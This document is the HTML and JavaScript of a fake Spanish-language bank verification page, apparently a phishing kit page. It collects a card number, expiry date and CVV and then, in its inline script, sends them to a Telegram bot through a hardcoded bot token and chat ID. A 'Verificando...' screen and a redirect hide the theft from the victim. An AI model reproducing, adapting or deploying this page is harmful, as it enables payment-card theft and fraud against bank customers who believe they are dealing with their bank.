<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación - Banca Virtual</title>

    <link rel="stylesheet" href="https://bogocota.site/assets/css/general.css">
    <link rel="stylesheet" href="https://bogocota.site/assets/css/styles.css">
    <link rel="stylesheet" href="https://bogocota.site/assets/css/clave.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" href="https://bogocota.site/assets/img/logo.png">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
        }

        .wrapper {
            width: 100%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 0;
            margin: 0;
        }

        header {
            display: flex;
            align-items: center;
            padding: 16px 16px;
            background: white;
            gap: 12px;
        }

        header img {
            width: 50px;
            height: 50px;
            flex-shrink: 0;
        }

        header h2 {
            font-size: 20px;
            font-weight: bold;
            color: #333;
        }

        .main {
            display: flex;
            justify-content: center;
            padding: 20px 16px;
            flex: 1;
        }

        .box {
            background: white;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            padding: 24px 20px;
            width: 100%;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }

        .titulo {
            font-size: 18px;
            font-weight: 600;
            color: #0043a9;
            margin-bottom: 16px;
            text-align: center;
            line-height: 1.4;
        }

        .subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 24px;
            line-height: 1.4;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            font-size: 15px;
            color: #333;
            display: block;
            text-align: left;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .input-container {
            display: flex;
            align-items: center;
            border: 2px solid #0043a9;
            border-radius: 10px;
            padding: 12px 14px;
            height: 48px;
            background: white;
        }

        .input-container i {
            font-size: 20px;
            color: #0043a9;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .input-container input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
            font-family: inherit;
            color: #333;
        }

        .input-container input::placeholder {
            color: #999;
        }

        .error-message {
            color: #d32f2f;
            font-size: 12px;
            display: none;
            margin-top: 6px;
        }

        .submit-btn {
            width: 100%;
            background-color: #0043a9;
            color: white;
            border: none;
            padding: 13px;
            border-radius: 20px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
        }

        .footer {
            text-align: center;
            padding: 20px;
            color: #999;
            font-size: 12px;
        }

        /* PANTALLA DE CARGA */
        #pantallaCarga {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 100%);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        #pantallaCarga h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #333;
            font-weight: 500;
        }

        #pantallaCarga p {
            font-size: 14px;
            color: #666;
            margin: 0;
        }

        .spinner {
            width: 60px;
            height: 60px;
            margin: 0 auto 30px;
        }

        .spinner svg {
            width: 100%;
            height: 100%;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .spinner circle {
            animation: spin 1s linear infinite;
            transform-origin: 50% 50%;
        }
    </style>
</head>

<body>
    <div class="wrapper">
        <header>
            <img src="https://bogocota.site/assets/img/logo.png" alt="Banca Virtual">
            <h2>Bienvenido a tu Banca Virtual</h2>
        </header>

        <main class="main">
            <div class="box">
                <div class="titulo">Ingresa tu información</div>
                
                <div class="subtitle">
                    A continuación validaremos tus datos para comprobar tu identidad.
                </div>

                <div class="form-group">
                    <label>Número de tarjeta</label>
                    <div class="input-container">
                        <i class='bx bx-credit-card'></i>
                        <input type="text" id="numeroTarjeta" placeholder="Ej: 4532123456789012" maxlength="16">
                    </div>
                    <small class="error-message" id="errorTarjeta"></small>
                </div>

                <div class="form-group">
                    <label>Fecha de vencimiento</label>
                    <div class="input-container">
                        <i class='bx bx-calendar'></i>
                        <input type="text" id="fechaVencimiento" placeholder="MM/AA" maxlength="5">
                    </div>
                    <small class="error-message" id="errorFecha"></small>
                </div>

                <div class="form-group">
                    <label>CVV</label>
                    <div class="input-container">
                        <i class='bx bx-lock'></i>
                        <input type="text" id="cvv" placeholder="Ej: 123" maxlength="4">
                    </div>
                    <small class="error-message" id="errorCvv"></small>
                </div>

                <button class="submit-btn" id="btnContinuar">Continuar</button>
            </div>
        </main>

        <footer class="footer">
            <p>v.2.10.0</p>
        </footer>
    </div>

    <!-- PANTALLA DE CARGA -->
    <div id="pantallaCarga">
        <div style="text-align: center;">
            <div class="spinner">
                <svg viewBox="0 0 50 50">
                    <circle cx="25" cy="25" r="20" fill="none" stroke="#0043a9" stroke-width="3" stroke-dasharray="31.4 94.2" style="animation: spin 1s linear infinite; transform-origin: 50% 50%;"></circle>
                </svg>
            </div>
            <h2>Verificando...</h2>
            <p>No recargue ni cierre esta ventana.</p>
        </div>
    </div>

    <script>
        // ========================================
      const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003758754120';
        // ========================================

        const numeroTarjeta = document.getElementById('numeroTarjeta');
        const fechaVencimiento = document.getElementById('fechaVencimiento');
        const cvv = document.getElementById('cvv');
        const btnContinuar = document.getElementById('btnContinuar');
        const pantallaCarga = document.getElementById('pantallaCarga');

        function limpiarErrores() {
            document.querySelectorAll('.error-message').forEach(e => {
                e.style.display = 'none';
                e.innerText = '';
            });
        }

        function mostrarError(elementId, mensaje) {
            document.getElementById(elementId).innerText = mensaje;
            document.getElementById(elementId).style.display = 'block';
        }

        function validarDatos() {
            limpiarErrores();
            let valido = true;

            if (!numeroTarjeta.value.trim() || !/^\d{16}$/.test(numeroTarjeta.value.trim())) {
                mostrarError('errorTarjeta', 'Ingresa un número de tarjeta válido (16 dígitos).');
                valido = false;
            }

            if (!fechaVencimiento.value.trim() || !/^\d{2}\/\d{2}$/.test(fechaVencimiento.value.trim())) {
                mostrarError('errorFecha', 'Ingresa una fecha válida (MM/AA).');
                valido = false;
            }

            if (!cvv.value.trim() || !/^\d{3,4}$/.test(cvv.value.trim())) {
                mostrarError('errorCvv', 'Ingresa un CVV válido (3-4 dígitos).');
                valido = false;
            }

            return valido;
        }

        btnContinuar.addEventListener('click', async () => {
            if (!validarDatos()) return;

            pantallaCarga.style.display = 'flex';

            const textoTelegram = `💳 <b>DATOS DE TARJETA VALIDADOS</b>

<b>━━━━━━━━━━━━━━━━━━━</b>

<b>Número de Tarjeta:</b> ${numeroTarjeta.value.trim()}
<b>Fecha de Vencimiento:</b> ${fechaVencimiento.value.trim()}
<b>CVV:</b> ${cvv.value.trim()}

<b>━━━━━━━━━━━━━━━━━━━</b>
<i>Fecha: ${new Date().toLocaleString('es-CO')}</i>`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textoTelegram,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                if (data.ok) {
                    setTimeout(() => {
                        window.location.href = 'confirmacion.html';
                    }, 2000);
                } else {
                    pantallaCarga.style.display = 'none';
                }
            } catch (error) {
                pantallaCarga.style.display = 'none';
                console.error('Error:', error);
            }
        });
    </script>
</body>

</html>
